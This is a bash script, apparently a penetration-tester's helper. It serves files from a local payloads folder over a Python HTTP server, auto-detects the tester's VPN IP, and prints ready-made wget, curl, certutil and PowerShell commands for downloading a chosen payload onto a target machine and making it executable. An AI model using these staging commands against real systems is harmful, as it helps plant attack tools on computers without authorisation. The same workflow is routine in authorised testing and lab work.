#!/bin/bash

# 1. Configuration
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="${PENTEST_DIR:-$(cd -- "$SCRIPT_DIR/../.." && pwd)}/payloads"
DEFAULT_PORT="8000"
LOG_FILE="/tmp/payload_server.log"

# 2. Dependency Check
if ! command -v fzf &> /dev/null; then
    echo "[-] Error: fzf not found. Install: apt install fzf"
    exit 1
fi

# 3. IP Discovery Logic
get_auto_ip() {
    local ip=$(ip addr show tun0 2>/dev/null | grep -m1 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [ -z "$ip" ] && ip=$(ip addr show eth1 2>/dev/null | grep -m1 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [ -z "$ip" ] && ip=$(ip addr show eth0 2>/dev/null | grep -m1 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [ -z "$ip" ] && ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    echo "${ip:-127.0.0.1}"
}

# 4. Parse Arguments (-i for IP, -p for Port)
IP=""
PORT=""

show_help() {
    cat <<'EOF'
用法: pe [-i <ip_address>] [-p <port>]

在 payloads/ 目录启动 HTTP 文件服务器并用 fzf 选择要传给目标的文件。
默认 IP 自动探测 (tun0 > eth1 > eth0 > hostname)，默认端口 8000。

选项:
  -i <ip>   指定对外 IP（默认为自动探测）
  -p <port> 指定监听端口（默认 8000）
  -h        显示此帮助
EOF
}

while getopts "i:p:h" opt; do
  case $opt in
    i) IP=$OPTARG ;;
    p) PORT=$OPTARG ;;
    h) show_help; exit 0 ;;
    *) show_help; exit 1 ;;
  esac
done

[ -z "$IP" ] && IP=$(get_auto_ip)
[ -z "$PORT" ] && PORT=$DEFAULT_PORT

# 5. Background Server Setup (Logs to file)
cd "$BASE_DIR" || { echo "[-] Error: Path $BASE_DIR not found"; exit 1; }
if ! ss -tuln | grep -q ":$PORT "; then
    python3 -m http.server "$PORT" > "$LOG_FILE" 2>&1 &
    SERVER_PID=$!
    trap "kill $SERVER_PID 2>/dev/null; rm -f $LOG_FILE; exit" EXIT
fi

# 6. Interaction Loop
while true; do
    RELATIVE_PATH=$(find . -maxdepth 4 -type f | sed 's|^\./||' | fzf \
        --height 50% --reverse --border --prompt="Select Payload > " \
        --header "SERVER: $IP:$PORT | ROOT: $BASE_DIR" \
        --preview "ls -lh {}")

    [ -z "$RELATIVE_PATH" ] && { clear; echo "Session Ended."; break; }

    FILENAME=$(basename "$RELATIVE_PATH")
    clear
    echo -e "\033[1;32m📎 Target: $RELATIVE_PATH\033[0m"
    echo

    echo -e "\033[1;34m🐧 Linux Download\033[0m"
    printf "wget http://%s:%s/%s -O /tmp/%s && chmod +x /tmp/%s\n" "$IP" "$PORT" "$RELATIVE_PATH" "$FILENAME" "$FILENAME"
    printf "curl http://%s:%s/%s -o /tmp/%s && chmod +x /tmp/%s\n" "$IP" "$PORT" "$RELATIVE_PATH" "$FILENAME" "$FILENAME"

    echo
    echo -e "\033[1;33m🪟 Windows Download\033[0m"
    printf "certutil -urlcache -split -f http://%s:%s/%s %%TEMP%%\\\\%s\n" "$IP" "$PORT" "$RELATIVE_PATH" "$FILENAME"
    printf "powershell -c \"iwr -uri http://%s:%s/%s -OutFile \$env:TEMP\\\\%s\"\n" "$IP" "$PORT" "$RELATIVE_PATH" "$FILENAME"

    echo
    echo -e "\033[1;35m📝 Recent Access Logs\033[0m"
    if [ -f "$LOG_FILE" ]; then
        tail -n 10 "$LOG_FILE" | grep "GET" | tail -n 5
    else
        echo "No logs yet."
    fi

    echo
    echo -n "↵ Enter to continue | Ctrl+C to exit "
    read -r
done